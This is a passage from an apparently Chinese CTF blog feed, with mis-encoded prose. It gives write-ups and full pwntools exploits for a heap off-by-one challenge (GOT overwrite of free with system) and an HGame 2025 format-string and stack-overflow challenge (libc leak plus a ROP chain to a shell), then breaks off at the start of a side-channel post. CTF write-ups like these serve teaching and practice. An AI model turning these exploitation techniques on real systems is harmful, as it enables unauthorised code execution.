bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input((*(&amp;heaparray + v1))-&gt;content, (*(&amp;heaparray + v1))-&gt;size + <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä¿®æ”¹çš„å­—èŠ‚æ•°æ ¹æ®ç”³è¯·æ—¶çš„ç¡®å®š ä½†æ˜¯è¿™é‡Œå¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°å¯ä»¥å¤šå†™ä¸€ä¸ªå­—èŠ‚ æœ‰off-by-oneæ¼æ´</p>
<p><del>åŸæ¥ä¹‹å‰èƒ½ç›´æ¥è¦†ç›–ç‰©ç†å†…å­˜ä¸­ä¸‹ä¸€ä¸ªchunkæ˜¯off-by-oneçš„ç»“æœè€Œä¸æ˜¯è¿‡ç¨‹(</del></p>
<h3 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h3><p>ä¹‹å‰çš„å †é¢˜éƒ½èƒ½è½»æ˜“åšåˆ°è¦†å†™chunk_header è€Œè¿™ä¸€é¢˜åªèƒ½æº¢å‡ºä¸€ä¸ªå­—èŠ‚ è¦ç”¨åˆ°çš„æŠ€å·§å°±å¤šäº†ä¸€äº›</p>
<h4 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><p>åˆ©ç”¨æº¢å‡ºçš„ä¸€å­—èŠ‚æ¥è¦†ç›–åä¸€ä¸ªå †å—çš„<code>size</code>åŸŸä½¿å…¶åŒ…å«å†åä¸€ä¸ªå †å— å½“è¢«è¦†ç›–äº†<code>size</code>çš„å †å—è¢«é‡Šæ”¾å¹¶å†è¢«ç”³è¯·å›æ¥æ—¶å°±èƒ½å¾—åˆ°ä¸€ä¸ªè¦†ç›–äº†åä¸€ä¸ªå †å—çš„å †å—</p>
<h4 id="åˆ©ç”¨æ‰‹æ³•"><a href="#åˆ©ç”¨æ‰‹æ³•" class="headerlink" title="åˆ©ç”¨æ‰‹æ³•"></a>åˆ©ç”¨æ‰‹æ³•</h4><p>headerçš„å‰8 bytesæ˜¯<code>prev_size</code>åŸŸ å½“å‰ä¸€ä¸ªå †å—æ²¡æœ‰åœ¨è¢«ä½¿ç”¨æ—¶ç”¨æ¥å­˜æ”¾å…¶å¤§å° è€Œå‰ä¸€ä¸ªå †å—åœ¨è¢«åˆ©ç”¨æ—¶<code>prev_size</code>å¯ä»¥ç”¨æ¥å­˜æ”¾å…¶æ•°æ® å¹³æ—¶è°ƒè¯•æ—¶ä¼šå‘ç°è¿™ä¸ªåŸŸä¸€èˆ¬éƒ½æ˜¯ç©ºçš„ å› ä¸ºç”³è¯·å †å—çš„å¤§å°é€šå¸¸éƒ½æ˜¯<code>N * 0x10</code> bytes ä¸éœ€è¦å†ç”±ç³»ç»Ÿæ¥å¯¹é½0x10 bytesä¹Ÿå°±ç”¨ä¸åˆ°è¿™ä¸ªåŸŸ è€Œå½“ç”³è¯·çš„å †å—å¤§å°ä¸å¯¹é½0x10 bytesæ—¶ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨å¤šç”³è¯·ä¸€äº›å†…å­˜æ¥å¯¹é½ æœ€å…ˆè¢«åˆ©ç”¨çš„(å¦‚æœæœ‰çš„è¯)å°±æ˜¯åä¸€ä¸ªå †å—<code>prev_size</code>åŸŸ</p>
<p>å¯¹äºåªèƒ½æº¢å‡ºä¸€ä¸ªå­—èŠ‚çš„åœºåˆ å¦‚æœä¸€å¼€å§‹ç”³è¯·äº†ä¸€ä¸ªå¤§å°ä¸º<code>N * 0x10 + 8</code> bytesçš„<code>chunk0</code> ç„¶åç”³è¯·ä¸€ä¸ªå¤§å°ä¸º<code>N1</code> bytesçš„<code>chunk1</code>ä»¥åŠå¤§å°ä¸º<code>N2</code> bytesçš„<code>chunk2</code>(å†ç”³è¯·ä¸€ä¸ªå †æ¥é˜²æ­¢åç»­è¦é‡Šæ”¾chunk2æ—¶å®ƒè¢«åˆå¹¶åˆ°<code>Top chunk</code>)</p>
<p>æ­¤æ—¶chunk1çš„<code>prev_size</code>å°±ä¼šç”¨æ¥å­˜æ”¾chunk0å¤šå‡ºæ¥çš„8 bytesæ•°æ®æ¥è®©chunk0çš„å¤§å°å¯¹é½<code>N * 0x10</code> bytes è‹¥å­˜åœ¨off-by-oneé‚£ä¹ˆç¼–è¾‘chunk0å°±èƒ½è¦†ç›–æ‰chunk1çš„<code>size</code>è¾¾åˆ°ç›®çš„</p>
<p>å¯¹äºè¿™é¢˜ ç”³è¯·å¦‚ä¸‹å¤§å°çš„å †å—(<code>hx</code>ä»£è¡¨è‡ªå®šç»“æ„ ä»ä¹‹å‰å®šä¹‰çš„ç»“æ„ä½“ä¹Ÿèƒ½çœ‹å‡ºé•¿åº¦éƒ½æ˜¯0x10 bytes):</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">h0:0x10    -&gt;	0:	0x18	=&gt;</span><br><span class="line">h1:0x10    -&gt;	1:	0x10	=&gt;</span><br><span class="line">h2:0x10    -&gt;	2:	0x10	=&gt;</span><br><span class="line">h3:0x10    -&gt;	3:	0x90	=&gt;	Top Chunk</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨off-by-oneå:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">h0:0x10    -&gt;	0:	0x18	=&gt;</span><br><span class="line">1:0x30    &lt;-	h1:	0x10	=&gt;</span><br><span class="line">h2:0x10    -&gt;	2:	0x10	=&gt;</span><br><span class="line">h3:0x10    -&gt;	3:	0x90	=&gt;	Top Chunk</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶chunk1å¯ä»¥åè¿‡æ¥æ§åˆ¶æœ¬æ¥ç”¨<code>content</code>åŸŸæ¥æ§åˆ¶è‡ªå·±çš„è‡ªå®šç»“æ„äº† è¿™é¢˜gotè¡¨å¯è¯»å¯å†™ æ‰€ä»¥å¯ä»¥å…ˆç”¨ä¸€ä¸ªå‡½æ•°çš„gotè¡¨åœ°å€æ¥è¦†ç›–h1çš„<code>content</code>åŸŸ å†è°ƒç”¨showå‡½æ•°æ‰“å°chunk1å°±èƒ½æ³„éœ²libcåœ°å€ ç„¶åå†åœ¨gotè¡¨ç”¨systemè¦†ç›–free æ­¤æ—¶é‡Šæ”¾ä¸€ä¸ªå†…å®¹ä¸º<code>/bin/sh\x00</code>çš„å †å—å³å¯get shell</p>
<p>å®Œæ•´exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;127.0.0.1&#x27;, 20000)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25169</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">so  = ELF(<span class="string">&quot;./libc6_2.23-0ubuntu11_amd64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Heap : &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;heap:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&quot;heap : &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_heap</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_heap</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Index :&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice :&quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x18</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x18</span>)  <span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x10</span>, <span class="string">b&#x27;1&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">create_heap(<span class="number">0x10</span>, <span class="string">b&#x27;2&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 2</span></span><br><span class="line">create_heap(<span class="number">0x30</span>, <span class="string">b&#x27;4&#x27;</span> * <span class="number">0x30</span>)  <span class="comment"># 3</span></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload1 += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x18</span> - <span class="built_in">len</span>(payload1)) + <span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">edit_heap(<span class="number">0</span>, payload1)</span><br><span class="line">delete_heap(<span class="number">1</span>)</span><br><span class="line">create_heap(<span class="number">0x30</span>, <span class="string">b&#x27;&#x27;</span>)          <span class="comment"># 1</span></span><br><span class="line">payload2 = <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0xff</span>) + p64(free_got)</span><br><span class="line"><span class="comment"># payload2 = b&#x27;B&#x27; * 0x20 + p64(0xff) + p64(read_got)</span></span><br><span class="line">edit_heap(<span class="number">1</span>, payload2)</span><br><span class="line">show_heap(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line">data = p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]</span><br><span class="line">free_addr = u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># read_addr = u64(data.ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Free_addr: <span class="subst">&#123;<span class="built_in">hex</span>(free_addr)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># print(f&quot;Read_addr: &#123;hex(read_addr)&#125;&quot;)</span></span><br><span class="line">libc = free_addr - so.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc)&#125;</span>&quot;</span>)</span><br><span class="line">system = libc + so.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit_heap(<span class="number">1</span>, p64(system))</span><br><span class="line">delete_heap(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2025-HGame-format-stackoverflow"><a href="#2025-HGame-format-stackoverflow" class="headerlink" title="[2025 HGame] format | stackoverflow"></a>[2025 HGame] format | stackoverflow</h2><p>è¡¨é¢ä¸Šæ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„åˆ©ç”¨ å®é™…ä¸Šéš¾ç‚¹åœ¨æ ˆæº¢å‡º ç›´æ¥çœ‹é‡è¦å‡½æ•°çš„ä¼ªä»£ç :</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">4</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you have n chance to getshell\n n = &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;type something:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%3s&quot;</span>, format) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;you type: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you have n space to getshell(n&lt;5)\n n = &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d\n&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">5</span> )</span><br><span class="line">    vuln((<span class="type">unsigned</span> <span class="type">int</span>)v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">vuln</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">4</span>]; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;type something:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°é¢˜ç›®åªè®©è¾“å…¥é•¿åº¦ä¸º3çš„æ ¼å¼åŒ–å­—ç¬¦ä¸² è¿™æ„å‘³ç€ä¸å¯èƒ½ç›´æ¥æ³„éœ²å‡ºå­˜æ”¾å‚æ•°çš„å¯„å­˜å™¨å’Œæ ˆä¸Šä»»æ„ä½ç½®çš„å€¼(è‡³å°‘è¦èƒ½è¾“å…¥<code>%[x]$p</code> å…¶ä¸­<code>[x]</code>æ˜¯è¦æ³„éœ²çš„ç¬¬xä¸ªåœ°å€)</p>
<p>æŒ‰ç…§amd64æ¡†æ¶çš„è°ƒç”¨åè®® æˆ‘ä»¬æœ€å¤šè¾“å…¥<code>%p </code>æ¥æ³„éœ²ç¬¬äºŒä¸ªå‚æ•°çš„ å³<code>RSI</code>ä¸­å­˜å…¥çš„å€¼ å†æ¥çœ‹çœ‹ä¸»å‡½æ•°çš„æ§åˆ¶æµ åœ¨æ‰§è¡Œ<code>printf(format);</code>ä¹‹å‰è°ƒç”¨çš„æ˜¯<code>printf(&quot;you type: &quot;);</code> <code>printf()</code>åœ¨è°ƒç”¨å®Œæˆå<code>RSI</code>å­˜å…¥çš„æ˜¯è¾“å‡ºçš„å­—ç¬¦ä¸²çš„åœ°å€(ä¾‹å¦‚printf(â€œnum: %dâ€, 123);åœ¨è°ƒç”¨å<code>RSI -&gt; &quot;num: 123&quot;</code>) è¿™ä¸ªåœ°å€æ˜¯æ ˆä¸Šçš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea     rax, aYouType   ; &quot;you type: &quot;</span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _printf</span><br><span class="line">lea     rax, [rbp+format]</span><br><span class="line">mov     rdi, rax        ; format</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _printf</span><br><span class="line">add     [rbp+var_4], 1</span><br></pre></td></tr></table></figure>

<p>è€Œåœ¨è¿›è¡Œå®Œä¸Šè¿°çš„è°ƒç”¨åæ²¡æœ‰ä»»ä½•ä¿®æ”¹<code>RSI</code>çš„é€»è¾‘</p>
<p>ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯é€šè¿‡æ³„éœ²æ ˆçš„ä¸€ä¸ªåœ°å€æ¥æ³„éœ²<code>RBP</code> ç„¶ååœ¨åç»­<code>vuln</code>ä¸­ç›´æ¥æ„é€ ROPchain <code>printf(&quot;%[x]$p&quot;);</code>æ¥æ³„éœ²ä¸€ä¸ªlibcä¸­çš„åœ°å€ ä½†é—®é¢˜æ˜¯ç¨‹åºä¸­æ²¡æœ‰å¯ä»¥ç”¨çš„<code>pop RDI | ret</code> è®¡åˆ’æ³¡æ±¤</p>
<p>ä½†æ˜¯çªç„¶åˆæƒ³åˆ°æ—¢ç„¶éƒ½æœ‰æ— é™çš„æº¢å‡ºé‡äº† ä½•ä¸ç›´æ¥ä¿®æ”¹mainå‡½æ•°çš„æ ˆå¸§å¸ƒå±€å›åˆ°é¢˜ç›®ç›´æ¥ç»™å‡ºçš„æœ‰æ¼æ´çš„<code>printf(format);</code></p>
<p>æ‰€ä»¥è¿™é“é¢˜çš„æ€è·¯å°±æ˜¯:</p>
<ol>
<li>åªç”¨è¾“å…¥ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²<code>%p </code>æ¥æ³„éœ²æ ˆçš„ä¸€ä¸ªåœ°å€ ä»è€Œæ³„éœ²<code>RBP</code></li>
<li>è¾“å…¥-1æ•°æ®ç±»å‹æº¢å‡ºåœ¨<code>vuln</code>ä¸­è·å¾—æ— é™çš„æº¢å‡ºé‡</li>
<li>åœ¨<code>vuln</code>ä¸­é€šè¿‡æ ˆæº¢å‡ºå®Œæˆå¯¹<code>main</code>æ ˆå¸§å¸ƒå±€çš„ä¿®æ”¹ä»è€Œä½¿åŸæœ¬<code>rbp+format</code>çš„ä½ç½®å­˜æ”¾ä¸€ä¸ªèƒ½æ³„éœ²libcä¸Šåœ°å€çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²(ç»è¿‡è°ƒè¯• è¿™é‡Œå¯ä»¥æ˜¯<code>%9$p</code>)</li>
<li>å°†æ³„éœ²çš„<code>RBP</code>å¡«å›<code>RBP</code>çš„ä½ç½®ä¿è¯è¿”å›åˆ°ä¸»å‡½æ•°åä½¿ç”¨çš„æ ˆå¸§è¿˜æ˜¯åŸæ¥çš„</li>
<li>ä¿®æ”¹è¿”å›åœ°å€åˆ°æ‰§è¡Œ<code>lea     rax, [rbp+format]</code>è¿™æ¡çš„åœ°å€</li>
<li>å…¬å¼ret2libc</li>
</ol>
<p>ä¹‹æ‰€ä»¥è®°å½•è¿™é¢˜å°±æ˜¯å› ä¸ºä¹‹å‰æ ˆæº¢å‡ºåŸºæœ¬ä¸Šéƒ½æ˜¯ç”¨æ¥æ³„éœ²<code>cannary</code>æˆ–è€…ä¿®æ”¹è¿”å›åœ°å€çš„ è¿™è¿˜æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°é€šè¿‡æ ˆæº¢å‡ºæ¥æ§åˆ¶<code>Caller</code>çš„æ ˆå¸§å¸ƒå±€çš„ æœ‰ä¸€ç‚¹ç‚¹è„‘æ´ ä½†æ˜¯ä¹Ÿæ˜¯ç†æ‰€åº”å½“èƒ½æƒ³åˆ°çš„</p>
<p>å®Œæ•´exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">so = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">20000</span>)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;n = &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;something:&#x27;</span>, <span class="string">b&#x27;%p &#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">RBP = <span class="built_in">int</span>(r(<span class="number">0xC</span>).decode(), <span class="number">0x10</span>) + <span class="number">0x2130</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;RBP =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(RBP)&#125;</span>&#x27;</span>)</span><br><span class="line">sa(<span class="string">b&#x27;n = &#x27;</span>, <span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;AAAAA&#x27;</span></span><br><span class="line">ret = p64(<span class="number">0x4012CF</span>)</span><br><span class="line">formatS = <span class="string">b&#x27;%9$p\x00&#x27;</span></span><br><span class="line">payload = padding + p64(RBP) + ret + formatS</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">leak_addr = <span class="built_in">int</span>(r(<span class="number">0xC</span>).decode(), <span class="number">0x10</span>)</span><br><span class="line">base = leak_addr - <span class="number">0x29D90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;base =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x000000000002a3e5</span> + base</span><br><span class="line">system = so.symbols[<span class="string">&#x27;system&#x27;</span>] + base</span><br><span class="line">binsh = <span class="built_in">next</span>(so.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) + base</span><br><span class="line">sa(<span class="string">b&#x27;n = &#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">ret = p64(<span class="number">0x401333</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xC</span> + ret + p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¾§ä¿¡é“æ”»å‡»</title>
    <url>/2024/08/29/%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>ä¾§ä¿¡é“æ”»å‡»æœ€åŸå§‹çš„æƒ³æ³•æ˜¯ç›´æ¥å¯¹ç¨‹åºè¾“å…¥æ•°æ®è¿›è¡Œçˆ†ç ´æµ‹è¯• ä¾‹å¦‚ç¾ŠåŸæ¯2024é€†å‘çš„Rust-VM:</p>
<span id="more"></span>

<p>(è™½ç„¶è¿™å¹¶ä¸æ˜¯ä¾§ä¿¡é“æ”»å‡»çš„å‰ç½®çŸ¥è¯† ä½†æ˜¯ä¸å¦¨ç¢æˆ‘æŠŠå®ƒå½“æˆèƒ½è”æƒ³åˆ°ä¾§ä¿¡é“çš„æœ€åŸå§‹çš„æƒ³æ³•()</p>
<h2 id="2024-ç¾ŠåŸæ¯-Rust-vm"><a href="#2024-ç¾ŠåŸæ¯-Rust-vm" class="headerlink" title="[2024 ç¾ŠåŸæ¯]-Rust_vm"></a>[2024 ç¾ŠåŸæ¯]-Rust_vm</h2><p>å‰é¢çš„ç¬¬ä¸€æ­¥åŠ å¯†å’Œä¸»é¢˜çš„å…³ç³»ä¸å¤§ ç›´æ¥è·³è¿‡ åªéœ€è¦çŸ¥é“åŠ¨è°ƒå‡ºæ¥çš„ç»“æœæ˜¯å°†è¾“å…¥çš„å†…å®¹è¿›è¡Œbase64ç¬¬ä¸€æ­¥ç¼–ç  å³å°†è¾“å…¥æ•°æ®(flagåŒ…è£¹çš„å†…å®¹ é•¿åº¦ä¸º32bytes)åˆ†å‰²ä¸º6bits æœ€åé•¿åº¦æ˜¯44bytes é‡è¦çš„æ˜¯æ¥ä¸‹æ¥çš„è™šæ‹Ÿæœºè¿‡ç¨‹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F08%2F29%2F20240829-110246.png" alt="image-20240829110239568"></p>
<p>å¯ä»¥çœ‹åˆ°å¤„ç†å‡½æ•°è°ƒç”¨äº†22æ¬¡ å¹¶ä¸”æ¯æ¬¡å¤„ç†2bytesæ•°æ® è¿™æ—¶å€™å°±åº”è¯¥æ•æ„Ÿçš„å¯Ÿè§‰åˆ°çˆ†ç ´çš„å¯èƒ½æ€§ è€Œè™šæ‹Ÿæœºå†…éƒ¨:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// positive sp value has been detected, the output may be wrong!</span></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">proc</span><span class="params">(__int64 OPCODES_REGS, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// r9</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// al</span></span><br><span class="line">  __int64 v10; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// r12d</span></span><br><span class="line">  __int64 v12; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// r13</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v17; <span class="comment">// rbp</span></span><br><span class="line">  <span class="type">bool</span> v18; <span class="comment">// r14</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v19; <span 